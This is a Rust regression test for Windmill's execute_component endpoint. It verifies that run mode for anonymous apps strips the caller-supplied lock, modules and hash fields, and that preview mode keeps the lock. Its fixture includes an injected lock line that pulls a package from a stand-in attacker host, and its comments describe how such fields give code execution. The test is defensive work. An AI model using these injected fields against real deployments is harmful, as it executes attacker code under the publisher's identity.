//! Regression test for run-mode inline-script trust in
//! `POST /api/w/:workspace/apps_u/execute_component/:path`.
//!
//! An `ExecutionMode::Anonymous` app is reachable without authentication and its
//! jobs run on-behalf-of the app publisher. In "run" mode (no
//! `force_viewer_static_fields`) a no-id inline `raw_code` runnable is authorized
//! only against the `sha256(content)` pin, so every other `raw_code` field is
//! caller-controlled: `lock` is installed verbatim (a PEP 508 direct URL builds an
//! sdist, a bun lock runs `postinstall`), `modules` are inline sources, and `hash`
//! becomes the job's `runnable_id`, which makes the worker fetch and run a deployed
//! script by hash instead of the pinned content — each is code execution as the
//! publisher.
//!
//! This pins that in run mode the no-id inline arm runs only the pinned content:
//! `lock`, `modules` and `hash` are dropped. Preview mode (the app-editor /
//! `wmill app dev` path, run as the authenticated caller — the `/jobs/run/preview`
//! equivalent) keeps honoring the caller-supplied `lock`.

use serde_json::json;
use sqlx::{Pool, Postgres};
use windmill_test_utils::*;

// sha256("def main():\n    return 1\n"), the content-hash the policy pins.
const CONTENT: &str = "def main():\n    return 1\n";
const CONTENT_SHA: &str = "13e9ae3486a224c96a589306cbfdf9dafd96593694e3b4632548f2999cf2299f";
const APP_PATH: &str = "u/test-user/lock_injection_app";

fn client() -> reqwest::Client {
    reqwest::Client::new()
}

/// The pinned benign content plus every unauthenticated field: a lock (installed
/// verbatim), inline modules, and a hash that would select a deployed script.
fn evil_raw_code() -> serde_json::Value {
    json!({
        "content": CONTENT,
        "language": "python3",
        "path": format!("{APP_PATH}/a"),
        "lock": "evilpkg @ https://attacker.example/evil.tar.gz",
        "modules": { "m.py": { "content": "raise RuntimeError('pwned')", "language": "python3" } },
        "hash": 424242424242_i64
    })
}

#[sqlx::test(fixtures("base"))]
async fn test_run_mode_runs_only_pinned_content(db: Pool<Postgres>) -> anyhow::Result<()> {
    initialize_tracing().await;
    let server = ApiServer::start(db.clone()).await?;
    let port = server.addr.port();
    let ws = format!("http://localhost:{port}/api/w/test-workspace");

    // Deploy an anonymous app pinning one inline python component by content hash,
    // exactly as the deploy-time policy bundler emits `<component>:rawscript/<sha>`.
    let resp = client()
        .post(format!("{ws}/apps/create"))
        .header("Authorization", "Bearer SECRET_TOKEN")
        .json(&json!({
            "path": APP_PATH,
            "summary": "lock injection regression app",
            "value": {"type": "app", "grid": [], "subgrids": {}, "hiddenInlineScripts": [
                {"name": "a", "language": "python3", "content": CONTENT, "path": format!("{APP_PATH}/a")}
            ]},
            "policy": {
                "execution_mode": "anonymous",
                "on_behalf_of": null,
                "on_behalf_of_email": null,
                "triggerables_v2": {
                    "a": {"static_inputs": {}, "one_of_inputs": {}},
                    format!("a:rawscript/{CONTENT_SHA}"): {"static_inputs": {}, "one_of_inputs": {}}
                }
            }
        }))
        .send()
        .await?;
    assert_eq!(resp.status(), 201, "create app: {}", resp.text().await?);

    // Run mode, no id, no auth: the attacker supplies lock + modules + hash.
    let resp = client()
        .post(format!("{ws}/apps_u/execute_component/{APP_PATH}"))
        .json(&json!({ "component": "a", "args": {}, "raw_code": evil_raw_code() }))
        .send()
        .await?;
    let status = resp.status();
    let job_id = resp.text().await?;
    assert_eq!(
        status, 200,
        "benign pinned content must still be accepted and enqueued: {job_id}"
    );
    let job_id: uuid::Uuid = job_id.trim().parse()?;

    // The enqueued job must carry none of the caller-supplied fields: no lock, no
    // `_MODULES` (dropping `raw_code.modules` skips the push-time injection), and no
    // `runnable_id` (a caller `hash` there would run a deployed script by hash).
    let row = sqlx::query!(
        "SELECT raw_lock, runnable_id, jsonb_exists(args, '_MODULES') AS has_modules \
         FROM v2_job WHERE id = $1",
        job_id
    )
    .fetch_one(&db)
    .await?;
    assert_eq!(
        row.raw_lock, None,
        "run mode must strip the caller-supplied lock"
    );
    assert_eq!(
        row.runnable_id, None,
        "run mode must strip the caller-supplied hash (no run-by-hash of a deployed script)"
    );
    assert_eq!(
        row.has_modules,
        Some(false),
        "run mode must strip the caller-supplied modules"
    );

    // Preview mode (authenticated non-operator, the /jobs/run/preview equivalent)
    // must keep honoring the caller-supplied lock — the strip is run-mode only.
    let preview_lock = "# a caller lock preview must keep";
    let resp = client()
        .post(format!("{ws}/apps_u/execute_component/{APP_PATH}"))
        .header("Authorization", "Bearer SECRET_TOKEN_2")
        .json(&json!({
            "component": "a",
            "args": {},
            "force_viewer_static_fields": {},
            "raw_code": {
                "content": CONTENT,
                "language": "python3",
                "path": format!("{APP_PATH}/a"),
                "lock": preview_lock
            }
        }))
        .send()
        .await?;
    let status = resp.status();
    let job_id = resp.text().await?;
    assert_eq!(status, 200, "preview must be enqueued: {job_id}");
    let job_id: uuid::Uuid = job_id.trim().parse()?;
    let raw_lock = sqlx::query_scalar!("SELECT raw_lock FROM v2_job WHERE id = $1", job_id)
        .fetch_one(&db)
        .await?;
    assert_eq!(
        raw_lock.as_deref(),
        Some(preview_lock),
        "preview mode must preserve the caller-supplied lock"
    );

    Ok(())
}
